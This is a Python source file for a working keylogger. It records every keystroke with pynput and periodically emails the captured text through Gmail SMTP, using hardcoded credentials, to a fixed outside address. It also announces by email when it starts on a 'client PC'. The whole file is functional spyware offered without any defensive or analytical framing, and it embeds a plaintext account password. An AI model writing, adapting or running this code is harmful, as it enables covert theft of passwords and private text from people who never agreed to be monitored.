import os
import datetime
import time
from multiprocessing import Process
from pynput import keyboard, mouse

gmail_user = 'ozunakeylogger@gmail.com'
receiver = 'juandanielozuna2@gmail.com'
gmail_password = 'ozuna123'
loggedData = ''
fileName = '.log'
sent_email = False
def on_press(key):
    global loggedData
    send_email()
    try:
        loggedData += key.char
        return
    except AttributeError:
        if key == keyboard.Key.space:
            loggedData += ' (SPACE) '
            return
        if key == keyboard.Key.enter:
            loggedData += ' (ENTER) \n'
            return
        if key == keyboard.Key.backspace:
            loggedData += '<-(BACKSPACE)'
            return
        loggedData += " ({0}) ".format(key)
        return

def on_release(key):
    try:
        if key == keyboard.Key.esc:
            return False
    except AttributeError:
        return True

def start_logging():
    print("Hello World")
    send_application_start_message()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


import smtplib
def send_log():
    global loggedData
    try:
        #print('FOUND OUTPUT FILE')
        #f = open(fileName, "r")
        contents = loggedData
        #f.close()
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(gmail_user, gmail_password)
        subject = "Custom Keylogger Email; {0}".format(datetime.datetime.now().strftime("%b %d %Y %H:%M:%S"))
        message = """Subject: {0}
        \n\n
        {1}
        """.format(subject, contents)
        message = message.encode("ascii", errors="ignore")
        s.sendmail(gmail_user, receiver, message)
        print('EMAIL SENT TO ' + receiver)
        print(contents)
        loggedData = ''
    except:
        print('Unable to send logged data:')
        print(loggedData)

def send_application_start_message():
    try:
        startingDate = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls() 
        s.login(gmail_user, gmail_password)
        message = """Subject: OZUNA KEYLOGGER STARTED
        \n\n
        The purpose of this email is to indicate the the service started in a client PC
        Date of the act: {0}
        """.format(startingDate)
        s.sendmail(gmail_user, receiver, message)
    except:
        print('Unable to send email')

def send_email():
    dt = datetime.datetime.now()
    seconds = int(dt.strftime("%S"))
    everySeconds = 15
    modSeconds = seconds % everySeconds
    deltaMaxFactor = 5
    deltaFactor = everySeconds - modSeconds
    global sent_email
    if deltaFactor >= 0 and deltaFactor <= deltaMaxFactor and not sent_email:
        print("I made it inside DELTA: {0}, MAX: {1}, MOD: {2}, SECONDS: {3}".format(deltaFactor, deltaMaxFactor, modSeconds, seconds))
        send_log()
        sent_email = True
    elif deltaFactor > deltaMaxFactor:
        sent_email = False
 
    

def start_application():
    print('APPLICATION STARTED')
    start_logging()

# def start_application():
    # print('Started my thing')
    # if __name__ == '__main__':
    #     p2 = Process(target=emailSending)
    #     p2.start()
    #     logging()
    #     p2.join()


